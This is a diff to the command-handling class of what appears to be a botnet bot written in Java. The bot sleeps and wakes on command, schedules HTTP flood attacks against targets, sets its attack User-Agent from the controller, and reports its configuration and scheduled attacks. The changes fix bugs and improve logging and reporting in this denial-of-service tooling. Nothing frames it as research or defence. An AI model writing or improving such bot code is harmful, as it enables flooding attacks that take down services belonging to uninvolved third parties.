@@ -279,6 +279,9 @@ public class CoreController {
         in = IOManager.getInputStream(initResource);
       }
       ControllerProperties controllerProps = ControllerService.from(ControllerPropertiesFormat.JSON, in);
+      if (controller.getAuthentication() == null) {
+        controller.setAuthentication(new HashMap<>());
+      }
       controller.getAuthentication().putAll(controllerProps.getAuthentication());
     } catch (IOException exc) {
       failures++;
@@ -357,7 +360,7 @@ public class CoreController {
 
         final Interval attackHttpDelay = (Interval) cmd.getParams().get("delay");
         if (attackHttpDelay != null) {
-          delayCommand(attackHttpDelay.getRandomDuration(), CommandScope.KILL);
+          delayCommand(attackHttpDelay.getRandomDuration(), CommandScope.ATTACK_HTTPFLOOD);
         }
 
         for (HttpFloodAttack attack : httpAttacks) {
@@ -458,7 +461,7 @@ public class CoreController {
 
       case WAKEUP:
         if (!STATE.equals(BotState.ASLEEP)) {
-          throw new BotExecutionException("Cannot execute command, because [STATE] is not [ASLEEP]");
+          throw new BotExecutionException("Cannot execute command, because bot state is not [ASLEEP]");
         }
         final Interval wakeupDelay = (Interval) cmd.getParams().get("delay");
         if (wakeupDelay != null) {
@@ -482,7 +485,8 @@ public class CoreController {
    */
   private static void attackHttpFlooding(HttpFloodAttack attack) throws BotExecutionException {
     LOGGER.traceEntry("attack={}", attack);
-    LOGGER.info("Scheduling HTTP Flooding attack against {}...", attack.getTarget());
+    LOGGER.info("Scheduling HTTP {} Flooding attack against {}...",
+        attack.getMethod(), attack.getTarget());
     try {
       POOL.scheduleAttackHttpFlooding(attack);
     } catch (SchedulerException exc) {
@@ -526,11 +530,12 @@ public class CoreController {
     LOGGER.trace("Producing report...");
     Report report = new SimpleReport();
     if (AppConfigurationService.getConfigurations().isCnfInfo()) {
-      report.put(SimpleReport.KEY_CONFIGURATION, AppConfigurationService.getConfigurations());
+      report.put(SimpleReport.KEY_CONFIG_APP, AppConfigurationService.getConfigurations());
+      report.put(SimpleReport.KEY_CONFIG_CONTROLLER, CONTROLLER);
     }
     if (AppConfigurationService.getConfigurations().isTgtInfo()) {
       try {
-        report.put(SimpleReport.KEY_ATTACKS_HTTP, POOL.getScheduledHttpAttacks());
+        report.put(SimpleReport.KEY_ATTACKS, POOL.getScheduledHttpAttacks());
       } catch (SchedulerException exc) {
         throw new BotExecutionException("Cannot retrieve scheduled http attack. %s", exc.getMessage());
       }
@@ -637,7 +642,10 @@ public class CoreController {
           throw new BotExecutionException("Cannot update [sleep]. %s", exc.getMessage());
         }
         AppConfigurationService.getConfigurations().setSleep(sleep);
-      } else if (settings.equals(ControllerProperties.USER_AGENT)){
+      } else if (property.equals(ControllerProperties.USER_AGENT)){
+        if (CONTROLLER.getAuthentication() == null) {
+          CONTROLLER.setAuthentication(new HashMap<>());
+        }
         CONTROLLER.getAuthentication().put("User-Agent", settings.get(property));
       } else {
         LOGGER.warn("Cannot update [{}], skipping. This version does not provide the update procedure.", property);
